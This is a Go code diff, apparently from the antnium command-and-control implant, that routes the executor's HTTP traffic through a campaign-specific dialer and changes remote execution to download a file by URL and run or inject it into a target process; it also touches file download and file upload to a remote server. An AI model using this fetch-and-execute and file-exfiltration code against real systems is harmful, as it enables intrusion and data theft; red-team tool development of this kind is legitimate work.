@@ -10,19 +10,33 @@ import (
 	"strconv"
 	"strings"
 
+	log "github.com/sirupsen/logrus"
+
 	"github.com/dobin/antnium/pkg/arch"
+	"github.com/dobin/antnium/pkg/campaign"
 	"github.com/dobin/antnium/pkg/common"
 	"github.com/dobin/antnium/pkg/model"
 )
 
 type Executor struct {
 	interactiveShell *InteractiveShell
+	httpClient       *http.Client
 }
 
-func MakeExecutor() Executor {
+func MakeExecutor(campaign *campaign.Campaign) Executor {
 	interactiveShell := MakeInteractiveShell()
+	dialContext, err := common.NewDialContext(campaign)
+	if err != nil {
+		log.Errorf("Error: %s", err.Error())
+	}
+	tr := &http.Transport{
+		DialContext: dialContext,
+	}
+	httpClient := &http.Client{Transport: tr}
+
 	executor := Executor{
 		&interactiveShell,
+		httpClient,
 	}
 	return executor
 }
@@ -278,7 +292,18 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 		return ret, fmt.Errorf("invalid packet arguments given: no injectInto")
 	}
 
-	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(url, fileType, argline, injectInto)
+	res, err := e.httpClient.Get(url)
+	if err != nil {
+		return ret, err
+	}
+	defer res.Body.Close()
+
+	fileContent, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		return ret, err
+	}
+
+	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(fileContent, fileType, argline, injectInto)
 
 	ret["stdout"] = arch.ExecOutputDecode(stdOut)
 	ret["stderr"] = arch.ExecOutputDecode(stdErr)
@@ -306,7 +331,7 @@ func (e *Executor) actionFiledownload(packetArgument model.PacketArgument) (mode
 	}
 
 	// Download and write file
-	resp, err := http.Get(remoteurl)
+	resp, err := e.httpClient.Get(remoteurl)
 	if err != nil {
 		return ret, err
 	}
@@ -343,7 +368,6 @@ func (e *Executor) actionFileupload(packetArgument model.PacketArgument) (model.
 		return ret, fmt.Errorf("source file %s does not exist", source)
 	}
 
-	client := &http.Client{}
 	data, err := os.Open(source)
 	if err != nil {
 		return ret, err
@@ -352,7 +376,7 @@ func (e *Executor) actionFileupload(packetArgument model.PacketArgument) (model.
 	if err != nil {
 		return ret, err
 	}
-	resp, err := client.Do(req)
+	resp, err := e.httpClient.Do(req)
 	if err != nil {
 		return ret, err
 	}
